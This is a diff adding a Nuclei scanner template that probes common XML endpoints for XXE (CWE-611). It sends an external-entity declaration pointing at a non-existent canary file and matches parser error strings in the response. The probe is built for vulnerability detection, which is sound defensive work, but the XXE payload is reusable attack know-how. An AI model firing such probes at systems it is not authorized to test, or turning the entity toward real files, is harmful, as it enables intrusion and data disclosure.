@@ -1,0 +1,82 @@
+# gap: xxe-error-disclosure
+id: xxe-error-disclosure
+
+info:
+  name: XXE Parser Error Disclosure — External Entity Resolution Attempted
+  author: TyrusRC
+  severity: high
+  description: |
+    POSTs a well-formed XML document declaring an external entity pointing
+    at a non-existent file path (file:///nonexistent/nuclei-xxe-canary)
+    to common XML-accepting endpoints (/api/xml, /xml, /services, /soap,
+    /api/soap, /api, /upload, /api/v1/import, /import). A parser configured
+    to resolve external entities will surface either the canary path
+    (entity expansion succeeded and the filesystem error leaked through)
+    or its engine class name (Xerces, libxml2, lxml, SAXParseException,
+    XMLStreamException, etree.XMLSyntaxError) in the error response. Match
+    rejects responses that contain the literal request XML, which would
+    indicate plain request-body echo rather than parser engagement. This
+    is family detection for the XXE bug class (CWE-611) and replays on
+    future variants rather than a single CVE.
+  reference:
+    - https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing
+    - https://cwe.mitre.org/data/definitions/611.html
+    - https://portswigger.net/web-security/xxe
+  tags: custom,vulnerabilities,xxe,xml,injection,owasp
+
+http:
+  - raw:
+      - |
+        POST {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/xml
+        Accept: application/xml,text/xml,application/json,*/*
+
+        <?xml version="1.0" encoding="UTF-8"?>
+        <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///nonexistent/nuclei-xxe-canary">]>
+        <foo>&xxe;</foo>
+    payloads:
+      path:
+        - "/api/xml"
+        - "/xml"
+        - "/services"
+        - "/soap"
+        - "/api/soap"
+        - "/api"
+        - "/upload"
+        - "/api/v1/import"
+        - "/import"
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 400
+          - 500
+      - type: word
+        part: body
+        negative: true
+        condition: or
+        words:
+          - "<!ENTITY xxe SYSTEM"
+          - "<!DOCTYPE foo ["
+      - type: word
+        part: body
+        condition: or
+        words:
+          - "XMLDocumentFragmentScannerImpl"
+          - "org.apache.xerces"
+          - "XMLStreamException"
+          - "SAXParseException"
+          - "lxml.etree"
+          - "xml.etree.ElementTree"
+          - "libxml2"
+          - "etree.XMLSyntaxError"
+          - "nuclei-xxe-canary"
+          - "external entity"
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - '(XMLDocumentFragmentScannerImpl|org\.apache\.xerces[^\s<"]*|XMLStreamException|SAXParseException|lxml\.etree[^\s<"]*|xml\.etree\.ElementTree[^\s<"]*|libxml2|etree\.XMLSyntaxError|nuclei-xxe-canary)'
